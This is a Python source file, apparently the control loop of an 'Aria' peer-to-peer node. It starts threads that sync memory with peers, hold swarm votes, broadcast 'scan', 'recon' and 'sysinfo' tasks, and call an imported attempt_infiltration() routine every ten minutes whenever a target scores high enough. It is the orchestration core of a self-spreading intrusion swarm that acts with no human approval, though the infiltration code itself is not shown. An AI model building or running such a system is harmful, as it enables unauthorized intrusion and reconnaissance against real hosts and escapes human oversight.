import time
import threading
import os
from memory.decay import decay_memory
from memory.tagger import log_tagged_memory, get_recent_memory
from net.plugin_trigger_engine import run_plugins_by_trigger, start_plugins
from net.peer_client import sync_with_peer, load_peers 
from net.seed_decider import prioritize
from net.host_infiltrator import attempt_infiltration
from net.swarm_vote import swarm_vote, load_peer_logs
from net.swarm_merge import merge_peer_logs
from net.dynamic_leader import elect_leader
from net.task_splitter import assign_tasks, broadcast_assignments
from net import aria_server
import json
import random

MEMORY_FILE = "memory/log.txt"
PEER_LOGS = ["memory/log.txt"]  # can be updated to include peer files

def background_decay():
    while True:
        decay_memory()
        time.sleep(3600)


def background_plugins():
    from net.plugin_trigger_engine import start_plugins
    try:
        start_plugins()
    except Exception as e:
        from memory.tagger import log_tagged_memory
        import traceback
        log_tagged_memory(f"[plugin_thread] Plugin engine crashed: {e}", topic="plugin", trust="low")
        traceback.print_exc()
        import time
        while True:
            log_tagged_memory("[plugin_thread] Sleeping after crash. Auto-retry pending.", topic="plugin", trust="low")
            time.sleep(60)
            try:
                start_plugins()
                break
            except Exception as e:
                log_tagged_memory(f"[plugin_thread] Retry failed: {e}", topic="plugin", trust="low")
                traceback.print_exc()
      # Trigger engine handles its own scheduling

def background_sync():
    while True:
        SYNC_PEERS = load_peers()
        entries = get_recent_memory(limit=20)
        payload = json.dumps(entries).encode("utf-8")
        sync_with_peer(random.choice(SYNC_PEERS).strip(), payload)

def background_vote():
    while True:
        merge_peer_logs(PEER_LOGS)
        logs = load_peer_logs(PEER_LOGS)
        swarm_vote(logs, "decision")
        time.sleep(300)

def background_infiltration():
    while True:
        top = prioritize()
        if top and top[0]["score"] >= 3:
            attempt_infiltration()
        time.sleep(600)

def background_assign_tasks():
    while True:
        peers = load_peers_from_status()
        tasks = ["scan", "recon", "plugin:sysinfo"]
        assignments = assign_tasks(tasks, peers)
        broadcast_assignments(assignments)
        time.sleep(900)

def start_all():
    log_tagged_memory("Aria node booted.", topic="admin", trust="high")

    threading.Thread(target=background_decay, daemon=True).start()
    threading.Thread(target=background_plugins, daemon=True).start()
    threading.Thread(target=background_sync, daemon=True).start()
    threading.Thread(target=background_vote, daemon=True).start()
    threading.Thread(target=background_infiltration, daemon=True).start()
    threading.Thread(target=background_assign_tasks, daemon=True).start()

    print("[*] Attempting to start gRPC server")
    threading.Thread(target=safe_serve, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Shutdown requested.")

def safe_serve():
    try:
        print("[*] Attempting to start gRPC server")
        with open("server_debug.log", "w") as f:
            f.write("Starting serve()\\n")
        aria_server.serve()
    except Exception as e:
        with open("server_debug.log", "a") as f:
            f.write(f"Exception: {e}\\n")
        print(f"[!] Failed to start server: {e}")

def load_peers_from_status(file="peer_status.json"):
    try:
        with open(file, "r") as f:
            data = json.load(f)
        # Filter for peers with low failure count or recent seen time
        return [ip for ip, meta in data.items() if meta.get("failures", 99) < 99999]
    except Exception as e:
        print(f"[!] Failed to load peer list: {e}")
        return ["127.0.0.1"]
    
if __name__ == "__main__":
    start_all()